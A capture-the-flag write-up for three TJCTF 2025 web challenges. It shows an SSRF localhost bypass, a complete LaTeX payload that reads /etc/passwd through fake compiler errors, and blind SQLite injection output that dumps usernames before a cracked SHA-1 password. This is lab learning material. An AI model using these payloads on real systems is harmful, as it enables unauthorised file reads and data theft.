------------------

### CTF-: TJCTF 2025

------------------

- Web-:
  - Loopy
  - Texploit
  - Chilly-site

------------------

### Loopy

------------------

![image](https://github.com/user-attachments/assets/faccb1a6-72ec-437d-bbd7-8135c2400c9f)

------------------

- The website allows users to preview site which fits a Server Side Request Forgery scenario.

![image](https://github.com/user-attachments/assets/94cfbb3c-81d6-4518-a156-996930936ce9)

- The challenge description gave a hint to load a service at port `5000`.I tried to load it with `localhost:5000` and it  didn't work.Oops, it looks like the site has a long list of filters for the service.

![image](https://github.com/user-attachments/assets/be0b14a8-cfa0-4cc5-8ff4-9c6ee91393ae)

- You can try simple ssrf bypass tricks by using a redirect or just look another represntation of localhost which worked for me. Bypass-: ```http://0:5000/admin```.

![image](https://github.com/user-attachments/assets/82997e35-23b5-4a92-8f30-8f63bb633633)

- Flag-:```tjctf{i_l0v3_ssssSsrF_9o4a8}```

--------------------

### Texploit

--------------------

![image](https://github.com/user-attachments/assets/1774ea97-8ba2-4693-925a-f6d5e5022131)

---------------------

- The site is a latex compiler that compiles latex code into pdf.I tried the basic latex payload like `/input` and it didn't work.

![image](https://github.com/user-attachments/assets/7569e4ab-17d3-417f-a4f8-120f4b69350f)

-  After google searching for sometime,I got this payload from a [ctf writeup](https://hackmd.io/@toxicpie9/By154DFe9) that allows us to read files by triggering an error. The main idea is that `pdflatex` prints errors to stdout in a special format, so we can do something like \typeout{! abc} to trick the bot into thinking that abc is an error.Payload-:

```pdflatex
\catcode0=10  % make \0 not produce a syntax error
\catcode9=11  % make \t indents work correctly

\def\n{/etc/passwd}
\def\l{0}
\def\r{420}

\newread\file
\openin\file=\n

\newcounter{line}
\makeatletter
\@whilenum\value{line} < \r \do {
    \read\file to \fileline
    \stepcounter{line}
    \ifnum\value{line} > \l
        \typeout{! \fileline}
    \fi
}
```

- The payload above will read 420 chars in the `/etc/passwd` file.

![image](https://github.com/user-attachments/assets/ba14032a-7c87-400c-a9b0-6e4a7f1c361d)

- Flag-: ```tjctf{f1l3_i0_1n_l4t3x?} ```

![image](https://github.com/user-attachments/assets/4800df94-9e44-41f6-8c2b-7ad982f4338d)


--------------------

### Chill-site

--------------------

![image](https://github.com/user-attachments/assets/bb01070a-dd95-48b6-929d-e8b828ca056d)

---------------------

- The site is vulnerable to sqlite3 injection and it filters important chars like `or` and `--`.My teammates discovered a user `test` which made it easier to use `AND` and also replaced `--` with `/*`.
- After enum for a long time,I discovered columns for `stats` and `database`.I focused more on dumping `database` with my script.To avoid wasting time, we'll focus solely on column `user` and `pass`.The crucial user in this chall is `tuxtheflagmasteronlylikeslowercaseletters`.User's dump-:

```bash
[+] Number of tables-:2
[+] Number of Data's strings-:4
[+]Dumping String:table:database:column:user
[+]Finding String Length
[+] String-Length:-:3
[+] Found Char:-:Y
[+] Found Char:-:o
[+] Found Char:-:u
[+] Column user dumped::You
[+]Finding String Length
[+] String-Length:-:4
[+] Found Char:-:t
[+] Found Char:-:e
[+] Found Char:-:s
[+] Found Char:-:t
[+] Column user dumped::test
[+]Finding String Length
[+] String-Length:-:41
[+] Found Char:-:t
[+] Found Char:-:u
[+] Found Char:-:x
[+] Found Char:-:t
[+] Found Char:-:h
[+] Found Char:-:e
[+] Found Char:-:f
[+] Found Char:-:l
[+] Found Char:-:a
[+] Found Char:-:g
[+] Found Char:-:m
[+] Found Char:-:a
[+] Found Char:-:s
[+] Found Char:-:t
[+] Found Char:-:e
[+] Found Char:-:r
[+] Found Char:-:o
[+] Found Char:-:n
[+] Found Char:-:l
[+] Found Char:-:y
[+] Found Char:-:l
[+] Found Char:-:i
[+] Found Char:-:k
[+] Found Char:-:e
[+] Found Char:-:s
[+] Found Char:-:l
[+] Found Char:-:o
[+] Found Char:-:w
[+] Found Char:-:e
[+] Found Char:-:r
[+] Found Char:-:c
[+] Found Char:-:a
[+] Found Char:-:s
[+] Found Char:-:e
[+] Found Char:-:l
[+] Found Char:-:e
[+] Found Char:-:t
[+] Found Char:-:t
[+] Found Char:-:e
[+] Found Char:-:r
[+] Found Char:-:s
[+] Column user dumped::tuxtheflagmasteronlylikeslowercaseletters
[+]Finding String Length
[+] String-Length:-:6
[+] Found Char:-:h
[+] Found Char:-:u
[+] Found Char:-:m
[+] Found Char:-:a
[+] Found Char:-:n
[+] Found Char:-:A
[+] Column user dumped::humanA
```

- My team mate cracked the hash which is sha1 for `allsgud` which allowed him to login and get the flag.



---------------------
